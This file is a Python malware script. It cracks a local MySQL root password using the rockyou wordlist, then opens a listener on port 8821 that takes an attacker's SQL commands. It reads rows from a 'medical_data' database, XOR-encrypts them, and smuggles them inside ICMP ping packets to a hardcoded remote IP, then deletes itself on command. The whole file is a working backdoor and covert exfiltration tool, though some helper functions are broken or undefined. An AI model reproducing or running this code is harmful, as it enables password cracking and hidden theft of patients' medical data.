import mysql.connector as mysql
import os, sys, socket, struct, select, time
import datetime
import re
import string
from sys import argv

# function that checks if pw is correct
def connect(pw):
    try:
        db = mysql.connect(
            host = "localhost",
            user = "root",
            passwd = pw
        )
        return("success")
    except:
        return("wrong")

# Cracks the password, given a wordlist and a sql host (as root)
def getPassword(wordlist):
    for word in wordlist:
        if connect(word)=='success':
            pw = word
            return pw
    return "NO PASSWORD"

# helper function to make result a string
def query_to_string(x):
    if isinstance(x, int): return str(x)
    elif isinstance(x, datetime.date): return x.strftime("%Y-%m-%d")
    return x

# Get data
def get_data(pw, query):
    try:
        db = mysql.connect(
            host = "localhost",
            user = "root",
            passwd = pw
        )

        cursor = db.cursor()

        cursor.execute("use medical_data;")

        cursor.execute(query)
        result = cursor.fetchall()
    except mysql.connector.Error as err:
        return err

    data = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([query_to_string(x) for x in tup]) for tup in result])

    # result in string format without nonalphanumeric chars.
    data = re.sub(r'[^a-zA-Z\d\s\.]', "", data)
    return data

# helper function for xor two strings
def XOR(plaintext, key):
    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(plaintext, cycle(key)))

# takes password string, outputs encrypted string.
def encrypt_data(data):

    # simple xor encryption
    key = "BeyWfkPjXCERVUCXUIhEypFFYesgqPfKjLfEhZEqKTnolrrcekCJdGQtdVgnbXcBqkPcGyOEIrmpgbhqJjfMIClzdwNmmhhrHPJXIqCtdyXlmrlEyWmsIPvGHrlGmBkkdLKjRhNxueKCzRWaMiTUYTHHwsfvaNBShLUwmgXLQulWNBjiVOAwsTWjDCCBhrGQHJNCgUKBIneOjZsKZMHRPQecKRFLVksEvRDFnOmJihvTwIRuZgiZuLUiBwCxVjrbvbaNnKqdWuUPJFtfAlADmelZQYQoRaNaKZCeYWtmnzdgJdRlvS"
    enc_data = XOR(data, key)
    return enc_data

# Exfiltrate data in a packet header
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + (data[i + 1])
    if n:
        s += (data[i + 1] << 8)
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

# Sends the data in one packet.
def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
    if packetsize:
        ICMP_LEN_BYTES = packetsize
    else:
        ICMP_LEN_BYTES = 64

    socket.setdefaulttimeout(timeout)
    try:
        icmp = socket.getprotobyname('icmp')
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
    except socket.error as e:
        return e

    ICMP_ECHO_REQUEST = 8
    ICMP_CODE = 0
    ICMP_ID = os.getpid() & 0xFFFF
    ICMP_CHECKSUM = 0
    ICMP_SEQ = seq

    dest_addr = socket.gethostbyname(dest_addr)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST,
        ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
    bytesInDouble = struct.calcsize("d")
    data = data_to_send
    data = struct.pack("d", time.time()) + data.encode(errors = 'ignore')

    ICMP_CHECKSUM = checksum(header + data)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, ICMP_CODE,
        socket.htons(ICMP_CHECKSUM), ICMP_ID, ICMP_SEQ)

    packet = header + data

    s.sendto(packet, (dest_addr, 0))
    while True:
        try:
            recPacket, addr = s.recvfrom(1024)
            timeReceived = time.time()
            icmpHeader = recPacket[20:28]
            _type, _code, _checksum, _packetID, _sequence = struct.unpack(
                'bbHHh', icmpHeader)
            if _packetID == ICMP_ID:
                _ttl = struct.unpack("B", recPacket[8:9])[0]
                timeSent = struct.unpack(
                    "d", recPacket[28:28 + bytesInDouble])[0]
                delay = (timeReceived - timeSent) * 1000
                print (
                    "SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                    % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                time.sleep(1)
                ret = ("SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms" % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay))
                return ret
        except socket.timeout:
            ret = ("Request timeout for icmp_seq %d" % ICMP_SEQ)
            return
        except Exception as e:
            return e

def deobf(num):
    if num:
        return chr(num % 256) + convert(num // 256)
    else:
        return ""

def main():
    host = "192.168.20.12"
    client = "192.168.20.9"
    wordlist=open("rockyou-75.txt","r+").read().splitlines()
    password = getPassword(wordlist)
    pw=True
    if password == "NO PASSWORD":
         pw=False


    while True:
        server_socket = socket.socket(socket.AF_INET,
                      socket.SOCK_STREAM)
        server_socket.bind((host, 8821))

        server_socket.listen(1)

        (client_socket, client_address) = server_socket.accept()
        if pw==False:
                client_socket.send(b"Out")
                os.remove(argv[0])
                sys.exit()
        client_socket.send(b"In")
        while True:
            client_input = client_socket.recv(1024)
            if not client_input:
                client_socket.send(b"In")
            else:
                if client_input.decode() == 'E':
                    break
                elif client_input.decode() == 'D':
                    os.remove(argv[0])
                    sys.exit()
                else:
                    command = b""
                    for line in client_input.splitlines():
                        command += bytes([line[0],line[-1]])
                    sql_result = get_data(password, command.decode())
                    client_socket.send(b"ping!")
                    data = encrypt_data(sql_result)
                    result = sendOnePing(1, client, 102, data)
                    client_socket.send(result.decode())

        client_socket.close()
        server_socket.close()

if __name__ == "__main__":
    main()
